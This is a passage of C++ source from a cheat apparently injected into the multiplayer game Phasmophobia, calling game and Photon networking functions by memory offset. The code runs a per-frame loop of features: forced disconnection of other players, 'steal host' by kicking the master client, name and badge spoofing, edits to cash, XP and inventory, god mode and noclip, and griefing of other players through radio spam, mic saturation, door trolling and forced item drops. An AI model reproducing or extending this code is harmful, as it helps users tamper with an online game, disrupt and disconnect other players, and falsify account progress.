                case PendingRecoveryMode::ConnectUsingSettings:
                    Webhook_LogCommand("Connect Using Settings", "Clean recovery -> ConnectUsingSettings.");
                    Phasmo_Call<bool>(Phasmo::RVA_PN_ConnectUsingSettings, nullptr);
                    break;
                case PendingRecoveryMode::Reconnect:
                    Webhook_LogCommand("Reconnect", "Clean recovery -> Reconnect.");
                    Phasmo_Call<bool>(Phasmo::RVA_PN_Reconnect, nullptr);
                    break;
                case PendingRecoveryMode::ReconnectAndRejoin:
                    Webhook_LogCommand("Quick Rejoin", "Clean recovery -> ReconnectAndRejoin.");
                    Phasmo_Call<bool>(Phasmo::RVA_PN_ReconnectAndRejoin, nullptr);
                    break;
                default:
                    break;
                }

                s_pendingRecoveryMode = PendingRecoveryMode::None;
                s_pendingRecoveryDeadlineMs = 0;
                s_nextRecoveryKickMs = 0;
                return true;
            }

            if (now >= s_pendingRecoveryDeadlineMs) {
                s_pendingRecoveryMode = PendingRecoveryMode::None;
                s_pendingRecoveryDeadlineMs = 0;
                s_nextRecoveryKickMs = 0;
                return false;
            }

            if (now < s_nextRecoveryKickMs)
                return true;

            if (inRoom) {
                Phasmo_Call<bool>(Phasmo::RVA_PN_LeaveRoom, true, nullptr);
            } else if (inLobby) {
                Phasmo_Call<bool>(Phasmo::RVA_PN_LeaveLobby, nullptr);
            } else if (connected || ready) {
                Phasmo_Call<bool>(Phasmo::RVA_PN_Disconnect, nullptr);
            }

            s_nextRecoveryKickMs = now + 750;
            return true;
        };

        if (wantsQuickRejoin) {
            beginPendingRecovery(PendingRecoveryMode::ReconnectAndRejoin);
        }

        if (wantsConnectUsingSettings) {
            beginPendingRecovery(PendingRecoveryMode::ConnectUsingSettings);
        }

        if (wantsReconnect) {
            beginPendingRecovery(PendingRecoveryMode::Reconnect);
        }

        if (drivePendingRecovery()) {
            if (!wantsRoomSniper)
                return;
        }

        if (wantsJoinRandom) {
            Webhook_LogCommand("Join Random Room", "Joining a random room.");
            Phasmo_Call<bool>(Phasmo::RVA_PN_JoinRandomRoom, nullptr);
        }

        if (wantsJoinRandomFiltered) {
            Webhook_LogCommand("Join Random Filtered", "Joining a filtered random room.");
            joinRandomFiltered();
        }

        if (wantsJoinRandomOrCreateFiltered) {
            Webhook_LogCommand("Join Random Or Create", "Joining or creating a filtered room.");
            joinRandomOrCreateFiltered();
        }

        if (wantsJoinByName && roomNameStr) {
            std::string detail = "Room: " + roomName;
            Webhook_LogCommand("Join Room By Name", detail.c_str());
            Phasmo_Call<bool>(Phasmo::RVA_PN_JoinRoom, roomNameStr, nullptr, nullptr);
        }

        if ((wantsJoinOrCreate || wantsCreateRoom) && roomNameStr) {
            roomOptions = CreateDefaultRoomOptions();
        }

        if (wantsJoinOrCreate && roomNameStr && roomOptions) {
            std::string detail = "Room: " + roomName;
            Webhook_LogCommand("Join Or Create Room", detail.c_str());
            Phasmo_Call<bool>(Phasmo::RVA_PN_JoinOrCreateRoom, roomNameStr, roomOptions, nullptr, nullptr, nullptr);
        }

        if (wantsCreateRoom && roomNameStr && roomOptions) {
            std::string detail = "Room: " + roomName;
            Webhook_LogCommand("Create Room", detail.c_str());
            Phasmo_Call<bool>(Phasmo::RVA_PN_CreateRoom, roomNameStr, roomOptions, nullptr, nullptr, nullptr);
        }

        if (wantsLeaveRoom) {
            Webhook_LogCommand("Leave Room", "Photon LeaveRoom requested.");
            Phasmo_Call<bool>(Phasmo::RVA_PN_LeaveRoom, true, nullptr);
        }

        if (wantsLeaveLobby) {
            Webhook_LogCommand("Leave Lobby", "Photon LeaveLobby requested.");
            Phasmo_Call<bool>(Phasmo::RVA_PN_LeaveLobby, nullptr);
        }

        if (wantsDisconnectSelf) {
            Webhook_LogCommand("Disconnect Self", "Photon Disconnect requested.");
            Phasmo_Call<bool>(Phasmo::RVA_PN_Disconnect, nullptr);
        }

        if (wantsRoomSniper) {
            static ULONGLONG s_lastSniperAttemptMs = 0;
            const ULONGLONG now = GetTickCount64();
            const ULONGLONG delay = static_cast<ULONGLONG>(std::clamp(NETWORK_RoomSniperDelayMs, 250, 10000));

            const bool connected = Phasmo_Call<bool>(Phasmo::RVA_PN_IsConnected);
            const bool ready = Phasmo_Call<bool>(Phasmo::RVA_PN_IsConnectedAndReady);
            const bool inRoom = Phasmo_Call<bool>(Phasmo::RVA_PN_GetInRoom);
            if (!inRoom && (connected || ready) && (now - s_lastSniperAttemptMs) >= delay) {
                if (hasJoinRandomFilters)
                    joinRandomFiltered();
                else
                    Phasmo_Call<bool>(Phasmo::RVA_PN_JoinRandomRoom, nullptr);
                s_lastSniperAttemptMs = now;
            }
        }
    }

    static void ApplyStealHost()
    {
        if (!NETWORK_StealHost)
            return;

        NETWORK_StealHost = false;

        bool connected = false, ready = false, inRoom = false, isMaster = false;
        if (!TryGetPhotonStateRaw(connected, ready, inRoom, isMaster))
            return;

        if (!connected || !inRoom || IsInGame() || isMaster)
            return;

        void* masterPlayer = Phasmo_Call<void*>(Phasmo::RVA_PN_GetMasterClient);
        if (!masterPlayer || !Phasmo_Safe(masterPlayer, Phasmo::PP_ACTOR_NUMBER + sizeof(int32_t)))
            return;

        const int masterActor = *reinterpret_cast<int32_t*>(
            reinterpret_cast<uint8_t*>(masterPlayer) + Phasmo::PP_ACTOR_NUMBER);
        if (masterActor <= 0)
            return;

        MORE_DisconnectMode = 6;
        MORE_DisconnectTarget = masterActor;
        MORE_DisconnectPlayer = true;
        Logger::WriteLine("[Phasmo] Steal host: targeting actor %d", masterActor);

        ApplyDisconnectPlayer();
    }

    static void ApplyLeavePeople()
    {
        if (!MORE_LeavePeople)
            return;

        MORE_LeavePeople = false;
        __try {
            if (!IsInGame())
                return;

            Phasmo::CCTVTruckTrigger* trigger = GetCCTVTruckTrigger();
            if (!trigger || !Phasmo_Safe(trigger, sizeof(Phasmo::CCTVTruckTrigger))) {
                Logger::WriteLine("[More] Leave People: CCTVTruckTrigger not found.");
                return;
            }

            bool aliveOutside = false;
            bool localInsideTruck = false;
            __try {
                aliveOutside = Phasmo_Call<bool>(
                    Phasmo::RVA_CCTVTruckTrigger_ThereAreAlivePlayersOutsideTheTruck, trigger, nullptr);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                aliveOutside = false;
            }

            if (s_localPlayer && Phasmo_Safe(s_localPlayer, sizeof(Phasmo::Player))) {
                __try {
                    localInsideTruck = Phasmo_Call<bool>(
                        Phasmo::RVA_CCTVTruckTrigger_IsThisPlayersInsideTheTruck, trigger, s_localPlayer, nullptr);
                }
                __except (EXCEPTION_EXECUTE_HANDLER) {
                    localInsideTruck = false;
                }
            }

            Logger::WriteLine("[More] Leave People: aliveOutside=%d localInside=%d", aliveOutside ? 1 : 0, localInsideTruck ? 1 : 0);
            Webhook_LogCommand("Leave Van / Quit", aliveOutside
                ? "Truck exit requested while players are already outside."
                : "Truck exit requested without players outside.");

            Phasmo_Call<void>(Phasmo::RVA_CCTVTruckTrigger_Exit, trigger, nullptr, nullptr);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  CONFIG: DIFFICULTY CHANGER
    // ══════════════════════════════════════════════════════
    static void ApplyDifficultyChanger()
    {
        if (!CFG_DifficultyChanger) return;

        __try {
            Phasmo::LevelValues* values = Phasmo_GetLevelValues();
            if (!values || !values->currentDifficulty)
                return;

            Phasmo::Difficulty* diff = values->currentDifficulty;
            switch (CFG_DifficultyIndex)
            {
            case 0: // Amateur
                diff->difficulty = 0;
                diff->startingSanity = 100.0f;
                diff->sanityDrain = 1.0f;
                diff->playerSpeed = 1.0f;
                diff->evidenceGiven = 3;
                diff->ghostSpeed = 1.0f;
                diff->setupTime = 300.0f;
                diff->overrideMultiplier = 1.0f;
                break;
            case 1: // Intermediate
                diff->difficulty = 1;
                diff->startingSanity = 100.0f;
                diff->sanityDrain = 1.5f;
                diff->playerSpeed = 1.0f;
                diff->evidenceGiven = 3;
                diff->ghostSpeed = 1.1f;
                diff->setupTime = 120.0f;
                diff->overrideMultiplier = 2.0f;
                break;
            case 2: // Professional
                diff->difficulty = 2;
                diff->startingSanity = 100.0f;
                diff->sanityDrain = 2.0f;
                diff->playerSpeed = 1.0f;
                diff->evidenceGiven = 3;
                diff->ghostSpeed = 1.15f;
                diff->setupTime = 0.0f;
                diff->overrideMultiplier = 3.0f;
                break;
            case 3: // Nightmare
                diff->difficulty = 3;
                diff->startingSanity = 100.0f;
                diff->sanityDrain = 2.0f;
                diff->playerSpeed = 1.0f;
                diff->evidenceGiven = 2;
                diff->ghostSpeed = 1.2f;
                diff->setupTime = 0.0f;
                diff->overrideMultiplier = 4.0f;
                break;
            case 4: // Insanity
                diff->difficulty = 4;
                diff->startingSanity = 75.0f;
                diff->sanityDrain = 2.5f;
                diff->playerSpeed = 1.0f;
                diff->evidenceGiven = 1;
                diff->ghostSpeed = 1.25f;
                diff->setupTime = 0.0f;
                diff->overrideMultiplier = 5.0f;
                break;
            case 5: // Custom
                diff->difficulty = 6;
                diff->overrideMultiplier = std::max(diff->overrideMultiplier, 6.0f);
                break;
            default:
                break;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}
    }

    // ══════════════════════════════════════════════════════
    //  MAIN OnFrame — appelé chaque frame
    // ══════════════════════════════════════════════════════
    void PhasmoFeatures_OnFrame()
    {
        if (IsSuspended())
            return;

        const bool wantsCursedControl =
            CURSED_BreakItems || CURSED_UseItems || CURSED_InfinityCards ||
            CURSED_TriggerOuijaBoard || CURSED_TriggerMusicBox || CURSED_TriggerTarotCards ||
            CURSED_TriggerSummoningCircle || CURSED_TriggerHauntedMirror ||
            CURSED_TriggerVoodooDoll || CURSED_TriggerMonkeyPaw || CURSED_OuijaApplyNow;
        const bool wantsDoorControl =
            MORE_LockDoors || MORE_UnlockDoors || MORE_CloseDoors || MORE_CloseDoorsLoop ||
            MORE_LockUnlockDoorsLoop || MORE_OpenCloseDoorsLoop || MORE_DisableDoorInteraction ||
            MORE_WalkThroughDoors || MORE_DoorSlamAll || MORE_DoorRattleAll ||
            MORE_DoorLockSoundAll || MORE_DoorUnlockSoundAll;
        const bool wantsDoorTargetControl =
            MORE_TargetDoorClose || MORE_TargetDoorLock || MORE_TargetDoorSlam ||
            MORE_TargetDoorRattle || MORE_TargetDoorLockSound || MORE_TargetDoorUnlockSound;
        if (NETWORK_AutoFarm)
            RUN_FEATURE_SAFE("ApplyAutoFarm", ApplyAutoFarm());
        RUN_FEATURE_SAFE("ApplyNetworkMatchmakingTools", ApplyNetworkMatchmakingTools());
        if (NETWORK_StealHost)
            RUN_FEATURE_SAFE("ApplyStealHost", ApplyStealHost());

        // Keep lighting override active in lobby/menu scenes too.
        if (VIS_Fullbright)
            RUN_FEATURE_SAFE("ApplyFullbright", ApplyFullbright());

        // Identity spoofing must also run in lobby (not only during contract).
        if (MORE_CustomName || MORE_ApplyCustomNameNow)
            RUN_FEATURE_SAFE("ApplyCustomName", ApplyCustomName());
        if (MORE_SetBadge || MORE_SetBadgeMultiplayer || MORE_SetBadgeNetworked || MORE_SetBadgeNetworkedPersistent)
            RUN_FEATURE_SAFE("ApplyBadge", ApplyBadge());

        // Profile edits (cash/XP/level/prestige/items) are lobby operations.
        if (PROFILE_AddCash || PROFILE_AddXP || PROFILE_SetCash)
            RUN_FEATURE_SAFE("ApplyProfileEdits", ApplyProfileEdits());
        if (PROFILE_SetLevel || PROFILE_SetPrestige)
            RUN_FEATURE_SAFE("ApplyProfileVisualEdits", ApplyProfileVisualEdits());
        if (PROFILE_SetItems)
            RUN_FEATURE_SAFE("ApplyInventoryEdits", ApplyInventoryEdits());
        if (PROFILE_BackupSaveNow || PROFILE_ReloadSaveNow)
            RUN_FEATURE_SAFE("ProcessProfileSaveActions", ProcessProfileSaveActions());
        if (PROFILE_CashOverride)
            RUN_FEATURE_SAFE("ApplyCashOverride", ApplyCashOverride());
        if (PROFILE_AutoEndGameBonus || PROFILE_ApplyEndGameBonusNow)
            RUN_FEATURE_SAFE("ApplyEndGameProfileBonus", ApplyEndGameProfileBonus());
        if (MORE_CustomBonusReward)
            RUN_FEATURE_SAFE("ApplyBonusRewardModifier", ApplyBonusRewardModifier());
        RUN_FEATURE_SAFE("ApplyRewardScreenPolish", ApplyRewardScreenPolish());

        // Old orbit path is disabled for now; lobby props use the dedicated Lobby tab tooling.
        MOV_FlyingEquipment = false;

        const bool inGame = IsInGame();
        if (inGame && !s_lastInGameFrame) {
            s_inGameEnteredAtMs = GetTickCount64();

            // Drop newly-added high-risk loops during the map transition.
            MORE_TorchUseSpam = false;
            MORE_TargetFlashlightTroll = false;
            NETWORK_RoomSniper = false;
            NETWORK_JoinRandomRoom = false;
            NETWORK_JoinRandomRoomFiltered = false;
            NETWORK_JoinRandomOrCreateRoomFiltered = false;
        }

        // FOV editor works everywhere (lobby + in-game) — only needs camera.
        RUN_FEATURE_SAFE("ApplyFovEditor", ApplyFovEditor());

        if (!inGame) {
            s_lastInGameFrame = false;
            s_localPlayer = nullptr;
            s_levelCtrl = nullptr;
            if (VIS_Watermark)
                RUN_FEATURE_SAFE("DrawWatermark", DrawWatermark());
            if (VIS_StatsWindow)
                RUN_FEATURE_SAFE("DrawStatsWindow", DrawStatsWindow());
            return;
        }

        s_lastInGameFrame = true;
        const ULONGLONG now = GetTickCount64();
        const bool inGameWarmup = (s_inGameEnteredAtMs != 0) && (now - s_inGameEnteredAtMs < 5000);

        RUN_FEATURE_SAFE("RefreshCache", RefreshCache());
        RUN_FEATURE_SAFE("EnsureLocalPlayer", EnsureLocalPlayer());
        RUN_FEATURE_SAFE("HandlePlayerRequests", HandlePlayerRequests());

        if (PLAYER_GodMode)
            RUN_FEATURE_SAFE("ApplyGodMode", ApplyGodMode());
        if (PLAYER_SetSanity)
            RUN_FEATURE_SAFE("ApplySetSanity", ApplySetSanity());
        if (PLAYER_RequestSuicide)
            RUN_FEATURE_SAFE("ApplySuicide", ApplySuicide());
        RUN_FEATURE_SAFE("ApplyAiriHeldCosmetics", ApplyAiriHeldCosmetics());
        if (PLAYER_RadioSpamNetwork)
            RUN_FEATURE_SAFE("ApplyRadioSpamNetwork", ApplyRadioSpamNetwork());
        if (PLAYER_TruckRadioSpamNetwork)
            RUN_FEATURE_SAFE("ApplyTruckRadioSpamNetwork", ApplyTruckRadioSpamNetwork());
        if (PLAYER_MicSaturation)
            RUN_FEATURE_SAFE("ApplyMicSaturation", ApplyMicSaturation());
        if (PLAYER_HearDeadPlayers)
            RUN_FEATURE_SAFE("ApplyHearDeadPlayers", ApplyHearDeadPlayers());

        if (MOV_Teleport)
            RUN_FEATURE_SAFE("ApplyMovementTeleport", ApplyMovementTeleport());
        if (MOV_InfinityStamina)
            RUN_FEATURE_SAFE("ApplyInfinityStamina", ApplyInfinityStamina());
        if (MOV_CustomSpeed)
            RUN_FEATURE_SAFE("ApplyCustomSpeed", ApplyCustomSpeed());
        RUN_FEATURE_SAFE("ApplyFreecam", ApplyFreecam());
        RUN_FEATURE_SAFE("ApplyNoClip", ApplyNoClip());
        if (!s_frozenPlayers.empty())
            RUN_FEATURE_SAFE("ApplyFrozenPlayers", ApplyFrozenPlayers());

        if (GHOST_WeatherEnabled)
            RUN_FEATURE_SAFE("ApplyWeatherControl", ApplyWeatherControl());
        if (GHOST_CustomSpeed)
            RUN_FEATURE_SAFE("ApplyGhostCustomSpeed", ApplyGhostCustomSpeed());
        if (GHOST_ForceStateEnabled)
            RUN_FEATURE_SAFE("ApplyGhostStateSelection", ApplyGhostStateSelection());
        if (GHOST_ForceAbility)
            RUN_FEATURE_SAFE("ApplyForceAbility", ApplyForceAbility());
        if (GHOST_ForceInteract || GHOST_ForceInteractDoor || GHOST_ForceInteractProp ||
            GHOST_ForceNormalInteraction || GHOST_ForceTwinInteraction)
            RUN_FEATURE_SAFE("ApplyForceInteract", ApplyForceInteract());
        if (GHOST_PlayAudio || GHOST_StopAudio)
            RUN_FEATURE_SAFE("ApplyGhostAudio", ApplyGhostAudio());
        if (GHOST_AutoJournalSolver || GHOST_SolveJournalNow)
            RUN_FEATURE_SAFE("ApplyJournalSolver", ApplyJournalSolver());

        if (wantsCursedControl)
            RUN_FEATURE_SAFE("ApplyCursedItemControls", ApplyCursedItemControls());
        if (CURSED_OuijaApplyNow)
            RUN_FEATURE_SAFE("ApplyOuijaText", ApplyCustomOuijaText());
        if (CURSED_InfinityCards)
            RUN_FEATURE_SAFE("ApplyInfinityCards", ApplyInfinityCards());

        if (VIS_Watermark)
            RUN_FEATURE_SAFE("DrawWatermark", DrawWatermark());
        if (VIS_ActivityMonitor)
            RUN_FEATURE_SAFE("DrawActivityMonitor", DrawActivityMonitor());
        if (VIS_GhostProfile)
            RUN_FEATURE_SAFE("DrawGhostProfile", DrawGhostProfile());
        if (VIS_StatsWindow)
            RUN_FEATURE_SAFE("DrawStatsWindow", DrawStatsWindow());

        if (MORE_AntiKick)
            RUN_FEATURE_SAFE("ApplyAntiKick", ApplyAntiKick());
        RUN_FEATURE_SAFE("ApplyNoCameraRestrictions", ApplyNoCameraRestrictions());

        if (!inGameWarmup) {
            if (MORE_SpamFlashlight)
                RUN_FEATURE_SAFE("ApplySpamFlashlight", ApplySpamFlashlight());
            if (MORE_TargetFlashlightTroll)
                RUN_FEATURE_SAFE("ApplyTargetFlashlightTroll", ApplyTargetFlashlightTroll());
            if (MORE_TorchUseSpam)
                RUN_FEATURE_SAFE("ApplyTorchUseSpam", ApplyTorchUseSpam());
            if (wantsDoorControl)
                RUN_FEATURE_SAFE("ApplyDoorControls", ApplyDoorControls());
            if (wantsDoorTargetControl)
                RUN_FEATURE_SAFE("ApplyDoorTrollNearTarget", ApplyDoorTrollNearTarget());
            if (MORE_Pickup || MORE_PickupAnyProp || MORE_PocketEverything || MORE_CanPickup)
                RUN_FEATURE_SAFE("ApplyPickupTweaks", ApplyPickupTweaks());
        }

        if (MORE_GrabAllKeys)
            RUN_FEATURE_SAFE("ApplyGrabAllKeys", ApplyGrabAllKeys());
        if (MORE_ButterFingers)
            RUN_FEATURE_SAFE("ApplyButterFingers", ApplyButterFingers());
        if (MORE_DropHeldLocal)
            RUN_FEATURE_SAFE("ApplyDropHeldLocal", ApplyDropHeldLocal());
        if (MORE_DropHeldTarget)
            RUN_FEATURE_SAFE("ApplyDropHeldTarget", ApplyDropHeldTarget());
        if (MORE_DropAllInventoryLocal)
            RUN_FEATURE_SAFE("ApplyDropInventoryLocal", ApplyDropInventoryLocal());
        if (MORE_DropAllInventoryTarget)
            RUN_FEATURE_SAFE("ApplyDropInventoryTarget", ApplyDropInventoryTarget());
        if (MORE_DropAllInventoryAll)
            RUN_FEATURE_SAFE("ApplyDropInventoryAll", ApplyDropInventoryAll());
        if (MORE_DropHeldFiltered)
            RUN_FEATURE_SAFE("ApplyDropHeldFiltered", ApplyDropHeldFiltered());
        if (MORE_DropAllInventoryFiltered)
            RUN_FEATURE_SAFE("ApplyDropInventoryFiltered", ApplyDropInventoryFiltered());

        if (MORE_DisconnectPlayer)
            RUN_FEATURE_SAFE("ApplyDisconnectPlayer", ApplyDisconnectPlayer());
        if (MORE_AlwaysPerfectGame)
            RUN_FEATURE_SAFE("ApplyAlwaysPerfectGame", ApplyAlwaysPerfectGame());
        if (MORE_LeavePeople)
            RUN_FEATURE_SAFE("ApplyLeavePeople", ApplyLeavePeople());
        if (MORE_CompleteMissions)
            RUN_FEATURE_SAFE("ApplyCompleteMissionsOnExit", ApplyCompleteMissionsOnExit());
        if (CFG_DifficultyChanger)
            RUN_FEATURE_SAFE("ApplyDifficultyChanger", ApplyDifficultyChanger());
    }

} // namespace Cheat

#undef RUN_FEATURE_SAFE
